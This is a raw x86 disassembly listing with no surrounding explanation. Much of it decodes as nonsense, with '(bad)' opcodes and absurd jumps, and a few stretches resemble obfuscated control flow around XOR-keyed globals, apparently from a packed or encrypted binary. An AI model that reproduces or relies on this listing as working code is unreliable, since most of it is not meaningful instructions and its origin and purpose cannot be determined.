  413005:	xor    BYTE PTR [edx+0x28],dl
  413008:	rcr    DWORD PTR [edi],cl
  41300a:	adc    DWORD PTR [ecx],edx
  41300c:	lds    edi,FWORD PTR cs:[edx-0x7cc1d6a3]
  413013:	or     DWORD PTR [ebp+eiz*2+0x52],ecx
  413017:	xor    BYTE PTR [ecx],ah
  413019:	sbb    ebp,eax
  41301b:	lea    ecx,[ebp+0x6e]
  41301e:	enter  0x708a,0xe3
  413022:	daa    
  413023:	repnz popf 
  413025:	imul   BYTE PTR [ecx+0x34341522]
  41302b:	inc    ecx
  41302c:	enter  0xcb5e,0x22
  413030:	das    
  413031:	sar    BYTE PTR [edi+0x50],cl
  413034:	mov    ?,WORD PTR [esi+0x26f99caa]
  41303a:	xor    BYTE PTR [edx],ah
  41303c:	dec    eax
  41303d:	xchg   esi,eax
  41303e:	lahf   
  41303f:	mov    eax,ds:0xc37f3470
  413044:	mov    ch,0x0
  413046:	cdq    
  413047:	sahf   
  413048:	daa    
  413049:	not    DWORD PTR [ecx+0x36]
  41304c:	scas   eax,DWORD PTR es:[edi]
  41304d:	and    dh,cl
  41304f:	pusha  
  413050:	out    0x27,eax
  413052:	jne    0x4130c9
  413054:	ins    DWORD PTR es:[edi],dx
  413055:	jecxz  0x41306b
  413057:	adc    ebx,esi
  413059:	lahf   
  41305a:	clc    
  41305b:	xlat   BYTE PTR ds:[ebx]
  41305c:	sub    al,0xaf
  41305e:	(bad)  
  41305f:	mov    esi,0x6d420cc2
  413064:	add    BYTE PTR [esi-0x50],al
  413067:	mov    ah,BYTE PTR [ebp+0x7bfe859e]
  41306d:	bound  esi,QWORD PTR [edi]
  41306f:	stos   BYTE PTR es:[edi],al
  413070:	(bad)  
  413071:	jmp    0x54a7:0xad73fae2
  413078:	(bad)  
  41307b:	dec    esp
  41307c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41307d:	sbb    eax,0x69c6e553
  413082:	(bad)  
  413083:	jmp    0x4130b3
  413085:	into   
  413086:	pop    ss
  413087:	mov    ah,0x8e
  413089:	mov    WORD PTR [edx-0x69],fs
  41308c:	jl     0x4130ef
  41308e:	mov    ds:0xb19eac0b,al
  413093:	jmp    0xadecab23
  413098:	out    0x65,eax
  41309a:	out    dx,al
  41309b:	std    
  41309c:	adc    al,0x7d
  41309e:	in     al,0x94
  4130a0:	int    0xf6
  4130a2:	pusha  
  4130a3:	stos   DWORD PTR es:[edi],eax
  4130a4:	xchg   esp,eax
  4130a5:	std    
  4130a6:	and    esi,DWORD PTR [ebx+0x5c9ee80e]
  4130ac:	mov    ah,BYTE PTR [ecx+0x7a1f67cd]
  4130b2:	stos   DWORD PTR es:[edi],eax
  4130b3:	stos   BYTE PTR es:[edi],al
  4130b4:	and    ecx,DWORD PTR [edi+0x53]
  4130b7:	outs   dx,DWORD PTR ds:[esi]
  4130b8:	add    edx,DWORD PTR gs:[edx-0x2097f99c]
  4130bf:	jl     0x4130f0
  4130c1:	cld    
  4130c2:	adc    eax,0xdc75eccb
  4130c7:	outs   dx,BYTE PTR ds:[esi]
  4130c8:	and    al,0x70
  4130ca:	cli    
  4130cb:	add    eax,0x6669f70a
  4130d0:	fdivp  st(7),st
  4130d2:	adc    BYTE PTR [edx+0x45844c40],0x88
  4130d9:	jno    0x41310e
  4130db:	mov    ch,0x7e
  4130dd:	out    dx,eax
  4130de:	(bad)  
  4130df:	cs aas 
  4130e1:	(bad)  
  4130e2:	mov    edi,0x1800c032
  4130e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130e8:	adc    bh,0x78
  4130eb:	(bad)  
  4130ec:	cmp    DWORD PTR [eax+0x36],0x96abffc7
  4130f3:	xor    BYTE PTR [edi-0x47],ah
  4130f6:	push   edx
  4130f7:	je     0x41309a
  4130f9:	loope  0x41313c
  4130fb:	iret   
  4130fc:	cmp    ch,BYTE PTR [edi]
  4130fe:	(bad)  
  4130ff:	xor    al,0x15
  413101:	mov    ds,WORD PTR ds:0x20e58764
  413107:	lock mov edi,0xb60db04
  41310d:	mov    ah,0x49
  41310f:	and    al,0x9b
  413111:	nop
  413112:	out    0xac,al
  413114:	or     al,0x67
  413116:	jecxz  0x413110
  413118:	add    al,0x69
  41311a:	shr    DWORD PTR [ebx-0x44ff9a88],1
  413120:	inc    ebp
  413121:	adc    al,0x77
  413123:	mov    al,ds:0xe57dcf59
  413128:	and    dh,BYTE PTR [esi-0x5b8a5b81]
  41312e:	push   0x3
  413130:	mov    ch,0x9d
  413132:	retf   0x17a4
  413135:	into   
  413136:	add    DWORD PTR ds:0x4920d089,ebx
  41313c:	cdq    
  41313d:	(bad)  
  41313e:	fcomp  DWORD PTR [eax-0xf]
  413141:	je     0x4130e4
  413143:	pop    esp
  413144:	loop   0x413157
  413146:	frstor [edx-0x77]
  413149:	jne    0x413123
  41314b:	mov    DWORD PTR [ebp-0x2c],esi
  41314e:	mov    DWORD PTR [ebp-0x14],esi
  413151:	adc    ecx,0x52b8
  413157:	mov    DWORD PTR [ebp-0x8],esi
  41315a:	xor    ecx,DWORD PTR ds:0x42fdf9
  413160:	mov    ecx,DWORD PTR [ebp-0x18]
  413163:	xor    ecx,eax
  413165:	adc    DWORD PTR ds:0x42e228,ebx
  41316b:	xor    edi,edi
  41316d:	jmp    0x413451
  413172:	push   0x51581534
  413177:	popa   
  413178:	jne    0x4131ae
  41317a:	add    edx,ebp
  41317c:	cmp    al,BYTE PTR [ecx]
  41317e:	lock adc eax,0x61a3e055
  413184:	jo     0x4131f6
  413186:	mov    ecx,0x9d70707e
  41318b:	das    
  41318c:	sti    
  41318d:	add    BYTE PTR [ebp+ebx*8+0xc],ah
  413191:	add    esp,DWORD PTR [esp+edx*8+0xcb59a38]
  413198:	jecxz  0x413185
  41319a:	sti    
  41319b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41319c:	pop    esp
  41319d:	lods   eax,DWORD PTR ds:[esi]
  41319e:	jmp    0x41d58ec1
  4131a3:	mov    WORD PTR [edx],gs
  4131a5:	mov    bh,0x4f
  4131a7:	mov    DWORD PTR [edx+edx*2+0xdc178d7],edi
  4131ae:	neg    BYTE PTR [edx-0x56]
  4131b1:	fsub   QWORD PTR [ebx+0x72445ff3]
  4131b7:	mov    ?,WORD PTR [ebx+0x1e18d419]
  4131bd:	iret   
  4131be:	aam    0x1a
  4131c0:	shr    ebp,cl
  4131c2:	adc    DWORD PTR [ebx],ecx
  4131c4:	xchg   edi,eax
  4131c5:	push   ebx
  4131c6:	jo     0x413203
  4131c8:	xor    ch,BYTE PTR [esi-0x234273b0]
  4131ce:	add    bh,BYTE PTR [eax+0x58]
  4131d1:	fsubr  st(6),st
  4131d3:	nop
  4131d4:	or     BYTE PTR [esi-0x1f],cl
  4131d7:	repz cmp BYTE PTR [ebp+0x43],al
  4131db:	or     BYTE PTR [edx-0x52],0x1e
  4131df:	xchg   DWORD PTR [ebp-0x4],esp
  4131e2:	push   edi
  4131e3:	adc    BYTE PTR [ebx-0x69],bl
  4131e6:	xchg   BYTE PTR [ebp+edx*2-0x6a],ah
  4131ea:	test   BYTE PTR [edi-0x14],al
  4131ed:	mov    dh,0x2
  4131ef:	push   esi
  4131f0:	cs jmp 0xd0aa88a1
  4131f6:	test   eax,0x7deea47b
  4131fb:	mov    edi,0x50cfbcc1
  413200:	sub    al,0x14
  413202:	inc    ecx
  413203:	rcr    ebx,0xb7
  413206:	aas    
  413207:	iret   
  413208:	xchg   edi,eax
  413209:	dec    ebx
  41320a:	sti    
  41320b:	cmc    
  41320c:	shl    DWORD PTR [ecx],0x7a
  41320f:	cdq    
  413210:	in     al,dx
  413211:	mov    dh,0x45
  413213:	daa    
  413214:	and    al,0xb8
  413216:	in     eax,dx
  413217:	mov    BYTE PTR [esi+0x9],ah
  41321a:	sahf   
  41321b:	mov    bl,0x4
  41321d:	(bad)  
  41321e:	fsubr  QWORD PTR [ebx+0xd]
  413221:	xchg   esi,eax
  413222:	mov    ch,BYTE PTR [ebx+0x1c008391]
  413228:	je     0x41322f
  41322a:	sub    al,0x1f
  41322c:	add    cl,BYTE PTR [ebx-0x61]
  41322f:	shr    bl,cl
  413231:	clc    
  413232:	dec    ecx
  413233:	int3   
  413234:	cli    
  413235:	push   edx
  413236:	add    al,0xc3
  413238:	aas    
  413239:	fmul   st,st(3)
  41323b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41323c:	mov    ecx,0xf7bc3ece
  413241:	in     al,dx
  413242:	gs dec esi
  413244:	mov    esp,ds
  413246:	xchg   edi,eax
  413247:	mov    ds:0x439b713d,al
  41324c:	mov    edi,DWORD PTR [ebx+0x24]
  41324f:	cli    
  413250:	rcl    DWORD PTR [eax+0x4a],cl
  413253:	mov    dh,0xfc
  413255:	cmp    ch,al
  413257:	or     BYTE PTR [edx+0x2],dl
  41325a:	xor    bl,BYTE PTR [esi-0x940d10]
  413260:	mov    DWORD PTR [ebx+0x46b08c71],ebx
  413266:	stos   BYTE PTR es:[edi],al
  413267:	(bad)  
  413268:	in     al,0x17
  41326a:	cwde   
  41326b:	xchg   edx,eax
  41326c:	inc    edi
  41326d:	ja     0x4132c1
  41326f:	or     eax,0xd9a41d18
  413274:	addr16 pushf 
  413276:	inc    esi
  413277:	jns    0x4132df
  413279:	(bad)  
  41327a:	dec    ebx
  41327b:	es dec ebx
  41327d:	pop    ds
  41327e:	adc    esp,DWORD PTR [ecx+0x42]
  413281:	adc    eax,0x3435cff4
  413286:	pop    ebp
  413287:	lods   al,BYTE PTR ds:[esi]
  413288:	dec    esp
  413289:	outs   dx,DWORD PTR ds:[esi]
  41328a:	xchg   edi,eax
  41328b:	mov    ds:0x1b3b2f42,eax
  413290:	xchg   esi,eax
  413291:	ficom  WORD PTR [esi-0x68]
  413294:	(bad)  
  413296:	pop    esp
  413297:	stc    
  413298:	and    al,0x77
  41329a:	loope  0x41328c
  41329c:	jno    0x4132b7
  41329e:	add    eax,0x933b8443
  4132a3:	shl    bh,1
  4132a5:	pop    ecx
  4132a6:	fs in  al,dx
  4132a8:	rcr    edx,1
  4132aa:	add    al,0x99
  4132ac:	hlt    
  4132ad:	xor    BYTE PTR [ebp-0x2],0x9d
  4132b1:	adc    esp,ebx
  4132b3:	dec    ebp
  4132b4:	xchg   edi,eax
  4132b5:	pop    ebx
  4132b6:	dec    esp
  4132b7:	dec    eax
  4132b8:	xor    esi,DWORD PTR [ebx-0x1d]
  4132bb:	ss xor al,0x8a
  4132be:	cmp    DWORD PTR [ecx],0xd
  4132c1:	mov    esi,0x4994e12b
  4132c6:	mov    eax,ds:0x9eccd585
  4132cb:	out    0xbc,eax
  4132cd:	sahf   
  4132ce:	lahf   
  4132cf:	sbb    ecx,DWORD PTR [ebx+0x27]
  4132d2:	cmp    edi,DWORD PTR [edi-0xfe1e8ee]
  4132d8:	add    DWORD PTR [ebx+0x6a964ebd],eax
  4132de:	shl    al,0xa
  4132e1:	inc    edx
  4132e2:	jl     0x413285
  4132e4:	sbb    eax,0x7038fac1
  4132e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132ea:	cs inc ecx
  4132ec:	pop    ss
  4132ed:	cld    
  4132ee:	xchg   edi,eax
  4132ef:	mov    bl,0x4f
  4132f1:	xchg   ecx,eax
  4132f2:	ins    BYTE PTR es:[edi],dx
  4132f3:	sub    dl,BYTE PTR [esi-0x34]
  4132f6:	and    ebx,edi
  4132f8:	adc    eax,DWORD PTR [edi-0x4]
  4132fb:	or     eax,0x4257298c
  413300:	not    DWORD PTR [eax+0x4a2e42a6]
  413306:	or     al,0x1f
  413308:	popa   
  413309:	push   esi
  41330a:	xchg   edx,eax
  41330b:	ret    0xc721
  41330e:	aaa    
  41330f:	inc    edi
  413310:	repz cmp al,0xbf
  413313:	sar    BYTE PTR [esi-0x6b],1
  413316:	or     bl,BYTE PTR [eax-0x39]
  413319:	cmp    DWORD PTR [ebx-0x18],esi
  41331c:	and    eax,0x3c6a41b5
  413321:	ror    BYTE PTR [edi-0x73aeaa12],0xe7
  413328:	inc    ecx
  413329:	cmp    ebp,ebx
  41332b:	iret   
  41332c:	daa    
  41332d:	and    dh,BYTE PTR [ebp-0x2e]
  413330:	jbe    0x413382
  413332:	cmp    al,0xcb
  413334:	int    0x8b
  413336:	dec    BYTE PTR [esi+esi*4-0x8]
  41333a:	js     0x413385
  41333c:	loopne 0x4133a3
  41333e:	loope  0x413334
  413340:	(bad)  
  413342:	sbb    ecx,DWORD PTR [ecx+0x67]
  413345:	pop    eax
  413346:	loop   0x413343
  413348:	fistp  WORD PTR [edi+0x7eb7033b]
  41334e:	cdq    
  41334f:	or     BYTE PTR [ebx+0x16],bh
  413352:	push   ebp
  413353:	mov    BYTE PTR [eax],ch
  413355:	inc    ecx
  413356:	inc    ebp
  413357:	paddusw mm6,QWORD PTR [ecx]
  41335a:	xor    ch,0x19
  41335d:	pop    eax
  41335e:	(bad)  
  41335f:	push   edi
  413360:	inc    ecx
  413361:	cs push es
  413363:	lock push edi
  413365:	dec    esp
  413366:	inc    eax
  413367:	push   0xffffff98
  413369:	dec    ebp
  41336a:	and    edx,DWORD PTR [edx+0x211c67e8]
  413370:	xchg   ebx,eax
  413371:	clc    
  413372:	into   
  413373:	cli    
  413374:	adc    DWORD PTR [ebx*2+0x48e0bfa1],eax
  41337b:	pop    ds
  41337c:	scas   eax,DWORD PTR es:[edi]
  41337d:	(bad)  
  41337e:	retf   
  41337f:	(bad)  
  413380:	ret    0x73d1
  413383:	and    esi,DWORD PTR [edx-0x7e3be44d]
  413389:	lock ins BYTE PTR es:[edi],dx
  41338b:	xchg   ebp,eax
  41338c:	pop    esi
  41338d:	sbb    al,0xb5
  41338f:	cmp    BYTE PTR [eax+0x41a1ac02],bl
  413395:	sbb    eax,0x44e10005
  41339a:	js     0x413366
  41339c:	jae    0x4133a7
  41339e:	ja     0x413418
  4133a0:	mov    cl,0x81
  4133a2:	cmp    DWORD PTR [esi],esp
  4133a4:	or     bh,ch
  4133a6:	add    eax,0xeb4c4df5
  4133ab:	dec    esp
  4133ac:	outs   dx,BYTE PTR es:[esi]
  4133ae:	push   edi
  4133af:	pop    ebx
  4133b0:	mov    dh,0x72
  4133b2:	push   0x4
  4133b4:	hlt    
  4133b5:	mov    al,ds:0x826a280e
  4133ba:	lods   eax,DWORD PTR ds:[esi]
  4133bb:	fdiv   st(0),st
  4133bd:	je     0x4133a9
  4133bf:	aam    0x4d
  4133c1:	add    BYTE PTR [ecx-0x1d69efda],dl
  4133c7:	loope  0x413378
  4133c9:	mov    ecx,0x4c7b0ee4
  4133ce:	xchg   esp,eax
  4133cf:	aaa    
  4133d0:	xchg   esp,eax
  4133d1:	outs   dx,DWORD PTR ds:[esi]
  4133d2:	fucomi st,st(0)
  4133d4:	sbb    eax,0xe6335680
  4133d9:	int3   
  4133da:	and    DWORD PTR [ebp+ebp*8-0x3d],esi
  4133de:	out    dx,al
  4133df:	add    al,0xe9
  4133e1:	dec    ebp
  4133e2:	jmp    0x413441
  4133e4:	mov    BYTE PTR [ecx+0x6f],bl
  4133e7:	mov    gs,WORD PTR ds:0x8c077c0f
  4133ed:	stos   DWORD PTR es:[edi],eax
  4133ee:	sti    
  4133ef:	je     0x4133d2
  4133f1:	cld    
  4133f2:	mov    bl,0x9b
  4133f4:	mov    bl,0x3a
  4133f6:	out    dx,eax
  4133f7:	(bad)  
  4133f8:	cwde   
  4133f9:	lds    ebp,FWORD PTR [eax]
  4133fb:	dec    ecx
  4133fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133fd:	test   eax,0xa076663c
  413402:	mov    ecx,0x866b14dd
  413407:	jbe    0x4133e4
  413409:	xlat   BYTE PTR ds:[ebx]
  41340a:	cmp    eax,0x62d85dfa
  41340f:	ins    DWORD PTR es:[edi],dx
  413410:	fiadd  WORD PTR [ecx-0x68]
  413413:	(bad)  
  413414:	mov    al,0xe1
  413416:	es hlt 
  413418:	xchg   ebp,eax
  413419:	and    eax,0x9cf08964
  41341e:	push   ebp
  41341f:	leave  
  413420:	mov    DWORD PTR [edi-0x578d5604],ebp
  413426:	ror    DWORD PTR [edi-0x98fe62],1
  41342c:	pushf  
  41342d:	ss mov edi,0x950ed656
  413433:	mov    ebx,DWORD PTR [ecx]
  413435:	pop    ecx
  413436:	and    ebx,edx
  413438:	lds    ebp,FWORD PTR [ecx+ecx*2-0x608c7b88]
  41343f:	test   al,0x3f
  413441:	rcl    DWORD PTR [ebx],0x9b
  413444:	mov    edi,DWORD PTR [esi+0x3d]
  413447:	xchg   edx,eax
  413448:	mov    bl,0x2d
  41344a:	cwde   
  41344b:	cmp    DWORD PTR [edx],esi
  41344d:	xchg   ebx,eax
  41344e:	je     0x4134a3
  413450:	sti    
  413451:	add    ecx,ebx
  413453:	mov    eax,0x213e
  413458:	mov    DWORD PTR [ebp-0x20],ecx
  41345b:	mov    eax,DWORD PTR [ebp-0x20]
  41345e:	je     0x414b6a
  413464:	not    DWORD PTR ds:0x42fdf9
  41346a:	mov    eax,DWORD PTR [ebp-0x4]
  41346d:	xor    eax,0x7510855
  413472:	xor    DWORD PTR ds:0x42fdd5,0x8f6
  41347c:	add    eax,ebx
  41347e:	jmp    0x413762
  413483:	inc    edx
  413484:	mov    WORD PTR [eax],cs
  413486:	jp     0x41345e
  413488:	adc    BYTE PTR [edx+0x54],0xc3
  41348c:	mov    ss:0xfcfc640f,al
  413492:	jns    0x413480
  413494:	outs   dx,BYTE PTR ds:[esi]
  413495:	jo     0x413507
  413497:	mov    ecx,0x7170707e
  41349c:	dec    edi
  41349d:	retf   0x79ad
  4134a0:	mov    eax,0x4764bdf7
  4134a5:	retf   0x6eba
  4134a8:	xchg   edx,eax
  4134a9:	inc    edx
  4134aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134ab:	fcomp  DWORD PTR [ebx+0x45]
  4134ae:	cli    
  4134af:	mov    ebx,0x150af516
  4134b4:	nop
  4134b5:	std    
  4134b6:	test   DWORD PTR [ecx+ebx*4+0x56ef0459],0xcbf7c510
  4134c1:	cs test al,0x99
  4134c4:	loope  0x413487
  4134c6:	loop   0x4134e1
  4134c8:	cmp    eax,0x60a80d9e
  4134cd:	mov    dh,0x5e
  4134cf:	jmp    0x413482
  4134d1:	pop    edi
  4134d2:	add    DWORD PTR [ebx],edi
  4134d4:	add    BYTE PTR [edx+edi*4+0x3c4331b8],bl
  4134db:	dec    ebp
  4134dc:	ja     0x41350b
  4134de:	mov    eax,ds:0x59077165
  4134e3:	add    al,0x4a
  4134e5:	add    edx,DWORD PTR [edi-0x9]
  4134e8:	sar    ebx,cl
  4134ea:	and    BYTE PTR [ecx],al
  4134ec:	stos   BYTE PTR es:[edi],al
  4134ed:	mov    fs,WORD PTR [ecx-0x7b27a9b9]
  4134f3:	outs   dx,DWORD PTR ds:[esi]
  4134f4:	mov    al,0xc1
  4134f6:	adc    ch,BYTE PTR [ecx+0x6b]
  4134f9:	mov    bl,0xb6
  4134fb:	dec    ecx
  4134fc:	cli    
  4134fd:	inc    ebx
  4134fe:	adc    eax,0x683f45ca
  413503:	pop    eax
  413504:	sub    al,0x3a
  413506:	std    
  413507:	push   cs
  413508:	push   esp
  413509:	adc    DWORD PTR [edi+0x5f5e273d],esp
  41350f:	ficomp DWORD PTR [esi]
  413511:	lods   al,BYTE PTR ds:[esi]
  413512:	popa   
  413513:	push   ebx
  413514:	ss mov ebx,cs
  413517:	mov    BYTE PTR [esi-0x71],0xe7
  41351b:	and    dh,BYTE PTR [ecx]
  41351d:	dec    ebp
  41351e:	in     al,0xa5
  413520:	dec    edi
  413521:	inc    esi
  413522:	outs   dx,BYTE PTR ds:[esi]
  413523:	out    dx,al
  413524:	push   ebp
  413525:	mov    dl,0x86
  413527:	adc    bh,dl
  413529:	fild   WORD PTR [esi]
  41352b:	outs   dx,DWORD PTR ds:[esi]
  41352c:	pop    edi
  41352d:	jecxz  0x4134ce
  41352f:	cld    
  413530:	into   
  413531:	jle    0x41352c
  413533:	jne    0x4134db
  413535:	push   0x57abe10b
  41353a:	ret    
  41353b:	scas   al,BYTE PTR es:[edi]
  41353c:	jno    0x4135ae
  41353e:	jl     0x413526
  413540:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413541:	stc    
  413542:	les    ebp,FWORD PTR [edi+eiz*2]
  413545:	test   BYTE PTR [ebx],ch
  413547:	mov    bl,0xbe
  413549:	imul   dl
  41354b:	imul   DWORD PTR [ebx]
  41354d:	gs lods al,BYTE PTR cs:[esi]
  413550:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413551:	jnp    0x413546
  413553:	not    BYTE PTR [eax]
  413555:	cmp    eax,DWORD PTR ds:0x6a8a0a38
  41355b:	inc    esp
  41355c:	pop    esp
  41355d:	test   al,0x3c
  41355f:	jg     0x413544
  413561:	dec    ecx
  413562:	lods   eax,DWORD PTR ds:[esi]
  413563:	ss sti 
  413565:	leave  
  413566:	pop    ebx
  413567:	or     bh,BYTE PTR [edi-0x38]
  41356a:	push   0x60f83922
  41356f:	sbb    eax,0x3a69880
  413574:	lahf   
  413575:	adc    al,0x1
  413577:	rcl    DWORD PTR [esp+edi*8-0x1b],cl
  41357b:	pop    esi
  41357c:	(bad)  
  41357e:	xchg   ecx,eax
  41357f:	or     eax,0x6747dfa5
  413584:	pop    edi
  413585:	retf   
  413586:	sbb    DWORD PTR [ecx+0x50],ebp
  413589:	icebp  
  41358a:	add    dl,BYTE PTR [ebx+ecx*8-0x2357287b]
  413591:	mov    ds:0x7f9e37d4,al
  413596:	cli    
  413597:	(bad)  
  413598:	cmc    
  413599:	pop    esi
  41359a:	jle    0x4135be
  41359c:	push   edi
  41359d:	mov    eax,ds:0xf10a9d46
  4135a2:	mov    dh,0x36
  4135a4:	jb     0x4135e2
  4135a6:	or     ebx,DWORD PTR [esi-0x4ebe3b75]
  4135ac:	mov    eax,0xf3319331
  4135b1:	cmp    eax,DWORD PTR [esi]
  4135b3:	jne    0x41354f
  4135b5:	sbb    al,0xf3
  4135b7:	lea    ebx,[esi-0x21e98fc8]
  4135bd:	rcr    DWORD PTR [eax-0x6a],1
  4135c0:	add    al,0x7a
  4135c2:	jns    0x413635
  4135c4:	shr    DWORD PTR [ecx],0x7a
  4135c7:	loop   0x413552
  4135c9:	add    ebp,edi
  4135cb:	inc    eax
  4135cc:	xor    BYTE PTR [esi-0xc93a03f],ch
  4135d2:	sub    BYTE PTR [bx+si-0x1b7a],dh
  4135d7:	loope  0x41360a
  4135d9:	jno    0x413627
  4135db:	test   BYTE PTR [ebp-0x31],cl
  4135de:	pop    ecx
  4135df:	pop    ecx
  4135e0:	sbb    al,dl
  4135e2:	or     DWORD PTR [esi],0x78
  4135e5:	iret   
  4135e6:	push   eax
  4135e7:	lods   al,BYTE PTR ds:[esi]
  4135e8:	push   ebp
  4135e9:	and    bl,BYTE PTR [esi+edi*1-0x13f4a93d]
  4135f0:	lahf   
  4135f1:	mov    ?,esp
  4135f3:	sar    edx,1
  4135f5:	cmp    ecx,DWORD PTR [edi]
  4135f7:	mov    ds:0x10e505dc,al
  4135fc:	or     DWORD PTR [eax],edi
  4135fe:	mov    al,0xa6
  413600:	stc    
  413601:	inc    edx
  413602:	xchg   edi,eax
  413603:	call   0x1e93:0xfedef299
  41360a:	(bad)  
  41360b:	out    dx,eax
  41360c:	jp     0x413663
  41360e:	push   ebx
  41360f:	jp     0x4135e3
  413611:	dec    ebp
  413612:	mov    WORD PTR [edx+edi*2],ss
  413615:	ret    
  413616:	mov    DWORD PTR [esi+0x1b35d94c],ebx
  41361c:	and    dl,bl
  41361e:	sub    al,bl
  413620:	mov    fs,ebx
  413622:	mov    edx,0xd7030ac8
  413627:	xor    al,0x75
  413629:	fld    QWORD PTR ds:0x85260ff8
  41362f:	repz dec ebx
  413631:	loop   0x413671
  413633:	xchg   BYTE PTR [edi+0x53ba9b31],cl
  413639:	cs sbb al,0x25
  41363c:	sub    eax,0x56fe7d36
  413641:	test   al,0x3c
  413643:	sub    al,0x58
  413645:	inc    ecx
  413646:	jae    0x41369d
  413648:	inc    edi
  413649:	inc    esp
  41364a:	add    al,0xf9
  41364c:	lods   al,BYTE PTR ds:[esi]
  41364d:	dec    edi
  41364e:	or     edx,ebp
  413650:	loope  0x4136a4
  413652:	outs   dx,DWORD PTR ds:[esi]
  413653:	or     esi,ecx
  413655:	xor    esi,ebx
  413657:	mov    ds:0xe3d72be3,al
  41365c:	jge    0x413678
  41365e:	rcr    BYTE PTR [ecx-0x491f8230],cl
  413664:	or     al,0x81
  413666:	stos   DWORD PTR es:[edi],eax
  413667:	jb     0x41365c
  413669:	stos   BYTE PTR es:[edi],al
  41366a:	cdq    
  41366b:	jg     0x413617
  41366d:	or     al,0xde
  41366f:	dec    esi
  413670:	mov    dh,al
  413672:	push   ebp
  413673:	leave  
  413674:	jns    0x41360a
  413676:	xchg   ebp,eax
  413677:	push   0xe579cc7f
  41367c:	jnp    0x413649
  41367e:	push   esp
  41367f:	mov    bh,BYTE PTR [edx]
  413681:	and    DWORD PTR [edx],ebp
  413683:	popa   
  413684:	lock inc ebx
  413686:	pushf  
  413687:	fucomp st(4)
  413689:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41368a:	stos   BYTE PTR es:[edi],al
  41368b:	xor    cl,BYTE PTR [esi]
  41368d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41368e:	ins    DWORD PTR es:[edi],dx
  41368f:	cli    
  413690:	xor    DWORD PTR [edx+0x2f],ebp
  413693:	jno    0x413676
  413695:	ins    DWORD PTR es:[edi],dx
  413696:	cmp    dl,dl
  413698:	push   edi
  413699:	inc    ebp
  41369a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41369b:	pop    esi
  41369c:	repz (bad) 
  41369e:	stc    
  41369f:	mov    edx,0x7dd778ea
  4136a4:	jecxz  0x4136ab
  4136a6:	xchg   ebx,eax
  4136a7:	push   0xffffffa4
  4136a9:	mov    dl,0x84
  4136ab:	out    dx,eax
  4136ac:	pop    es
  4136ad:	or     cl,BYTE PTR [eax-0x61554a2]
  4136b3:	xor    ecx,DWORD PTR ds:0x555c3391
  4136b9:	mov    al,0x99
  4136bb:	aas    
  4136bc:	or     DWORD PTR [ebx-0x31e25156],edi
  4136c2:	pop    edx
  4136c3:	sub    DWORD PTR ds:0x8b3f689d,edx
  4136c9:	into   
  4136ca:	cmp    BYTE PTR [ebp-0x180c70bf],bh
  4136d0:	(bad)  
  4136d2:	cmp    BYTE PTR [eax+0x3f7e4130],ch
  4136d8:	(bad)  
  4136da:	lea    esp,fs:[edi+0x41]
  4136de:	and    BYTE PTR [eax-0x705516d8],0x2b
  4136e5:	push   ecx
  4136e6:	inc    esi
  4136e7:	ins    BYTE PTR es:[edi],dx
  4136e8:	ror    BYTE PTR ds:0xe1ebce1d,1
  4136ee:	(bad)  
  4136ef:	jecxz  0x41374e
  4136f1:	out    dx,al
  4136f2:	sub    eax,0x32607489
  4136f7:	ins    DWORD PTR es:[edi],dx
  4136f8:	pop    es
  4136f9:	ret    0xff62
  4136fc:	mov    ch,0xcb
  4136fe:	popf   
  4136ff:	mov    dh,0x27
  413701:	adc    edi,edi
  413703:	push   0x22
  413705:	pop    ebp
  413706:	cmovne ebp,edx
  413709:	inc    edx
  41370a:	inc    ebp
  41370b:	push   esp
  41370c:	jb     0x413775
  41370e:	xchg   edx,eax
  41370f:	xchg   esi,eax
  413710:	xchg   esi,eax
  413711:	frstor [eax+edx*8]
  413714:	fist   DWORD PTR [ebx+0x625a0237]
  41371a:	xchg   ecx,eax
  41371b:	pop    ecx
  41371c:	test   ecx,edx
  41371e:	aam    0x4b
  413720:	jge    0x41373c
  413722:	xor    al,0xc5
  413724:	fwait
  413725:	add    DWORD PTR [ecx+0x4d],ebx
  413728:	pop    esi
  413729:	or     DWORD PTR [edi-0xb3cfdf6],ecx
  41372f:	es push es
  413731:	sub    cl,BYTE PTR [edx]
  413733:	push   ebx
  413734:	mov    ds,WORD PTR [ebp-0x78]
  413737:	(bad)
  41373a:	adc    DWORD PTR [eax-0x4],ebx
  41373d:	sub    al,0xef
  41373f:	pop    ds
  413740:	pusha  
  413741:	cmp    al,0x43
  413743:	aad    0xfa
  413745:	jns    0x41375b
  413747:	test   eax,0xdd8eea3e
  41374c:	dec    edx
  41374d:	out    0x4e,eax
  41374f:	mov    dl,0x0
  413751:	lahf   
  413752:	or     cl,bh
  413754:	mov    ebx,DWORD PTR [ecx-0x25ea0bb0]
  41375a:	out    0x52,al
  41375c:	sbb    al,0xb2
  41375e:	sub    bl,BYTE PTR [esi-0x78]
  413761:	test   BYTE PTR [ebx],bh
  413763:	clc    
  413764:	jne    0x4141ef
  41376a:	push   DWORD PTR [ebp+0x8]
  41376d:	jmp    0x413a51
  413772:	and    al,0x98
  413774:	lods   al,BYTE PTR ds:[esi]
  413775:	shr    BYTE PTR [esp+edx*8-0x305f8b9c],0x9e
  41377d:	in     al,dx
  41377e:	in     al,0x6
  413780:	jle    0x413728
  413782:	xor    eax,0xb970706b
  413787:	jle    0x4137f9
  413789:	jo     0x4137c1
  41378b:	push   edx
  41378c:	loop   0x4137f1
  41378e:	sbb    DWORD PTR [eax-0x4e],edx
  413791:	gs ja  0x413766
  413794:	mov    eax,0x736c9c38
  413799:	push   ss
  41379a:	sbb    BYTE PTR [esi+ecx*4+0x2113aa52],0xb0
  4137a2:	ss loope 0x413788
  4137a5:	sub    bh,BYTE PTR [ecx+ebx*4-0x4f1f93ca]
  4137ac:	retf   
  4137ad:	or     al,dl
  4137af:	loop   0x413825
  4137b1:	test   BYTE PTR [ebp+0x3576450b],cl
